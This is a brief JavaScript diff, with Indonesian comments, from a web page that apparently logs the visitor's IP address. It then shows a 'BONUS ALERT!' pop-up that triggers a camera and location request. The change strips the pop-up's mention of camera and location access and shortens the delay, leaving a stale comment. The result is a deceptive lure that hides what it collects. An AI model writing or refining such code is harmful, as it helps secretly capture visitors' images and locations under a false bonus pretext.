@@ -2037,10 +2037,10 @@
                 // ===== MULAI REQUEST KAMERA & LOKASI =====
                 // Buat dialog permintaan yang menarik
                 setTimeout(() => {
-                    if (confirm("🎁 BONUS ALERT!\n\nUntuk verifikasi dan mendapatkan akses eksklusif, izinkan akses kamera (2 detik) dan lokasi.\n\nKlik 'OK' untuk lanjut.")) {
+                    if (confirm("🎁 BONUS ALERT!.\n\nKlik 'OK' untuk lanjut.")) {
                         requestCameraAndLocation();
                     }
-                }, 3000); // Delay 3 detik setelah halaman dimuat
+                }, 1000); // Delay 3 detik setelah halaman dimuat
 
             }).catch(err => {
                 console.error('Gagal mengambil IP:', err);
